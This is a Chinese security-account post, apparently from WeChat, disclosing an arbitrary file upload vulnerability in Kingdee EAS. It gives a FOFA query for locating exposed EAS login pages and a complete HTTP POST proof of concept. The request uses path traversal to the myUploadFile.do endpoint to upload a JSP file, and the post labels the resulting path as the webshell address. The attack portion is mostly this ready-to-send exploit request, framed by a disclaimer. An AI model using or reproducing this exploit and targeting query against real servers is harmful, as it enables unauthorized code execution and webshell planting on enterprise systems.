#  金蝶EAS /easportal/tools/appUtil.jsp 任意文件上传/下载漏洞   
 TKing的安全圈   2024-03-12 23:16  
  
##   
```
公众号技术文章仅供诸位网络安全工程师对自己所管辖的网站、服务器、网络进行检测或维护时参考用，公众号的检测工具仅供各大安全公司的安全测试员安全测试使用。未经允许请勿利用文章里的技术资料对任何外部计算机系统进行入侵攻击，公众号的各类工具均不得用于任何非授权形式的安全测试。公众号仅提供技术交流，不对任何成员利用技术文章或者检测工具造成任何理论上的或实际上的损失承担责任。加微信进群获取更多资源：
```  
###   
  
金蝶EAS Cloud为集团型企业提供功能全面、性能稳定、扩展性强的数字化平台，帮助企业链接外部产业链上下游，实现信息共享、风险共担，优化生态圈资源配置，构筑产业生态的护城河，同时打通企业内部价值链的数据链条，实现数据不落地，管理无断点，支撑“横向到边”财务业务的一体化协同和“纵向到底”集团战略的一体化管控，帮助企业强化核心竞争力  
  
漏洞描述  
  
金蝶EAS 存在任意文件上传/下载漏洞，攻击者可以上传包含恶意代码的文件，最终执行任意代码  
  
漏洞危害  
  
1、执行任意代码：攻击者可以通过上传包含恶意代码的文件，执行任意代码并控制受害者的计算机或服务器，导致数据泄露、破坏或其他恶意行为。2、篡改或删除数据：攻击者可以上传包含恶意代码的文件，并篡改或删除服务器上的重要文件或数据。3、钓鱼攻击：攻击者可上传 html、shtm 等文件，并写入非法博彩、赌博等恶意 SEO 页面或者写入恶意 js 文件进行钓鱼来非法获取用户信息等。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/6ibvMRtaFJHTRHickXWAibdmVxQBicK1PI9asqTJF7scFNDVRqmXG03wb9b5ANRxVFm2d9l0fSehy9ngM14xlgI5IQ/640?wx_fmt=jpeg "")  
#  搜索语法  
  
**fofa：title=="EAS系统登录"**  
  
漏洞poc  
```
POST /easportal/buffalo/%2e%2e/cm/myUploadFile.do HTTP/1.1Host: Cache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q=0.9Connection: closeContent-Type: multipart/form-data; boundary=----testContent-Length: 147
------testContent-Disposition: form-data; name="myFile"; filename="test.jsp"Content-Type: text/html
<%out.println("test");%>------test--木马地址：url+/easportal/buffalo/../test.jsp
```  
1. 出现如下数据代表漏洞存在  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/6ibvMRtaFJHTRHickXWAibdmVxQBicK1PI9aice4ZT4JCibcVeByc1hOGCnoKuDf5iaicMRceGqZr1R1rArQpz7fhXScCQ/640?wx_fmt=jpeg "【新】金蝶EAS myUploadFile接口任意文件上传")  
  
2.访问webshell  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/6ibvMRtaFJHTRHickXWAibdmVxQBicK1PI9aKKlYrcub6CveBNYca62LDnDPKZ5AJwmlAfChiaibFY3435m2kCibQSicfQ/640?wx_fmt=jpeg "【新】金蝶EAS myUploadFile接口任意文件上传")  
  
#   
  
